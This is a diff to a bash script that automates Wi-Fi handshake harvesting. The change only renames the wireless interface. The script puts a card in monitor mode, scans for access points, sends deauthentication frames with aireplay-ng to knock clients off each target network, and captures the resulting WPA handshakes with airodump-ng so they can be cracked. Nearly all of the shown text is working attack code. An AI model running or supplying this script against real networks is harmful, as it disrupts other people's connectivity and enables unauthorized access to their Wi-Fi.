@@ -39,7 +39,7 @@ main(){
 	trap "rm /home/kali/sha*" EXIT
 	airmon-ng check kill
 	airmon-ng start wlan1
-  	timeout 5 airodump-ng -w /home/kali/shakes wlan1mon < /dev/null > /dev/null 
+  	timeout 5 airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null 
 	#ip link set wlan0mon down
 	#iw wlan0mon set monitor control
 	#ip link set wlan0mon up
@@ -59,9 +59,9 @@ main(){
 		echo $bssid
 		echo $channel
 		
-		iwconfig wlan0mon channel $channel
-		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1mon < /dev/null > /dev/null &
-		aireplay-ng -a $bssid -0 10 wlan1mon
+		iwconfig wlan1 channel $channel
+		timeout 30 airodump-ng --bssid $bssid -w /home/kali/shakes wlan1 < /dev/null > /dev/null &
+		aireplay-ng -a $bssid -0 10 wlan1
 		sleep 10
 		checkHandshakes
 
